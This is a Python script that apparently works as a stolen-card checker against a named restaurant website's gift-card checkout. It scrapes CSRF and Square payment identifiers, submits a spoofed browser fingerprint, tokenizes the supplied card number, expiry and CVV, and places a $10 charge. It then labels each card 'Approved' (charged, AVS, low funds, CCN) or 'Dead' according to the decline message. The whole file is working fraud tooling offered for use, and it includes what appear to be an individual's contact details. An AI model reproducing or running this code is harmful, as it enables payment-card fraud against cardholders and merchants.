from utilsdf.functions import  capture
from httpx import AsyncClient


async def ghoul(cc, month, year, cvv):
    month = int(month)
    year = int(year)
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:

        r = await session.get(
            "https://www.flanigans.net/store/gift-cards/",
        )

        r2 = await session.get(
            "https://www.flanigans.net/csrf",
        )
        t2 = r2.text
        csrf = capture(t2, '{"token":"', '"')

        h3 = {
            "Host": "www.flanigans.net",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "*/*",
            "x-csrftoken": f"{csrf}",
            "origin": "https://www.flanigans.net",
            "referer": "https://www.flanigans.net/store/gift-cards/",
        }

        p3 = "gift_card_type=physical&gift_card_image=&recipient_country=US&amount=10&recipient_name=Sachio&recipient_street_address_1=118+W+132nd+St&recipient_street_address_2=&recipient_city=New+York&recipient_state=NY&recipient_postal_code=10027&gifter_name=Sachio+YT&message="

        r3 = await session.post(
            "https://www.flanigans.net/store/gift-cards/",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        ch = capture(t3, '"btn btn-brand" href="', '">Checkout</a>')
        ch2 = capture(
            t3,
            '"btn btn-brand" href="https://www.flanigans.net/store/checkout-v2/gift-card/flanigans?cart=',
            '">Checkout</a>',
        )

        r4 = await session.get(
            f"https://www.flanigans.net/api/checkout/{ch2}/payment_provider/",
        )
        t4 = r4.text
        sl = capture(t4, '"square_location_id":"', '"')
        sa = capture(t4, '"square_application_id":"', '"')

        r5 = await session.get(
            f"https://pci-connect.squareup.com/payments/hydrate?applicationId={sa}&hostname=www.flanigans.net&locationId={sl}&version=1.54.4",
        )
        t5 = r5.text
        si = capture(t5, '"sessionId":"', '"')

        p6 = {
            "components": '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","language":"es-419","color_depth":24,"resolution":[800,360],"available_resolution":[800,360],"timezone_offset":300,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":["uAnyCJE::pzhQQv2Epct9mb05FCo78e2bNlxBAAA::~3bV","NOHDJEKF::EtWyhYrdOuXLFpUSRQnbsePPm6laNteX::~EKN"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
            "fingerprint": "51a3940988511af4cfb03f96a066e5ba",
            "timezone": "300",
            "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "version": "d5fd6b68f21264c14a6aa32a61e8eefe29a68770",
            "website_url": "https://www.flanigans.net/",
            "client_id": f"{sa}",
            "browser_fingerprint_by_version": [
                {
                    "payload_json": '{"components":{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","language":"es-419","color_depth":24,"resolution":[800,360],"available_resolution":[800,360],"timezone_offset":300,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":["uAnyCJE::pzhQQv2Epct9mb05FCo78e2bNlxBAAA::~3bV","NOHDJEKF::EtWyhYrdOuXLFpUSRQnbsePPm6laNteX::~EKN"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"51a3940988511af4cfb03f96a066e5ba"}',
                    "payload_type": "fingerprint-v1",
                },
                {
                    "payload_json": '{"components":{"language":"es-419","color_depth":24,"resolution":[800,360],"available_resolution":[800,360],"timezone_offset":300,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":["uAnyCJE::pzhQQv2Epct9mb05FCo78e2bNlxBAAA::~3bV","NOHDJEKF::EtWyhYrdOuXLFpUSRQnbsePPm6laNteX::~EKN"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"85dd6f75e2b63625d24b962460588ee6"}',
                    "payload_type": "fingerprint-v1-sans-ua",
                },
            ],
        }

        r6 = await session.post(
            "https://connect.squareup.com/v2/analytics/token",
            json=p6,
        )
        t6 = r6.text
        at = capture(t6, '"token":"', '"')

        h7 = {
            "Host": "pci-connect.squareup.com",
            "accept": "application/json",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://web.squarecdn.com",
            "referer": "https://web.squarecdn.com/",
        }

        p7 = {
            "client_id": f"{sa}",
            "location_id": f"{sl}",
            "payment_method_tracking_id": "e9509434-9915-f446-bf68-e11bd1758313",
            "session_id": f"{si}",
            "website_url": "www.flanigans.net",
            "analytics_token": f"{at}",
            "card_data": {
                "billing_postal_code": "10027",
                "cvv": f"{cvv}",
                "exp_month": month,
                "exp_year": year,
                "number": f"{cc}",
            },
        }

        r7 = await session.post(
            "https://pci-connect.squareup.com/v2/card-nonce?_=1703359890528.3552&version=1.54.4",
            headers=h7,
            json=p7,
        )
        t7 = r7.text
        cn = capture(t7, '"card_nonce":"', '"')

        p8 = {
            "captcha_token": "",
            "used_digital_wallet": False,
            "payment_method_token": f"{cn}",
            "contact": {
                "name": "Sachio YT",
                "phone_number": "+19006318646",
                "email": "sachiopremiun@gmail.com",
                "subscribed_to_marketing_emails": True,
                "subscribed_to_marketing_sms": False,
            },
            "preferences": {"save_diner_information": False},
            "billing": {
                "name": "Sachio YT",
                "address1": "118 W 132nd St",
                "city": "New York",
                "state": "NY",
                "country": "US",
            },
            "is_billing_same_as_shipping": False,
        }

        r8 = await session.post(
            f"https://www.flanigans.net/api/checkout/{ch2}/",
            json=p8,
        )
        t8 = r8.text
        msg = capture(t8, '"message":"', '"')

        if r8.status_code == 200 or r8.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks -» $10"
        elif (
            msg
            == "Your card was declined. The postal code is invalid. Please check your card details and try again, or use another card."
        ):
            status = "Approved! ✅ -» avs"
        elif (
            msg
            == "The transaction was declined, possibly because you're at your credit limit. The postal code is invalid. The CVV value (the 3-digit security code on the back of the card) is invalid. Please check your card details and try again, or use another card."
            or msg
            == "The transaction was declined, possibly because you're at your credit limit. The postal code is invalid. Please check your card details and try again, or use another card."
        ):
            status = "Approved! ✅ -» low funds"
        elif (
            msg
            == "The CVV value (the 3-digit security code on the back of the card) is invalid. Please check your card details and try again, or use another card."
            or msg
            == "Your card was declined. The postal code is invalid. The CVV value (the 3-digit security code on the back of the card) is invalid. Please check your card details and try again, or use another card."
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
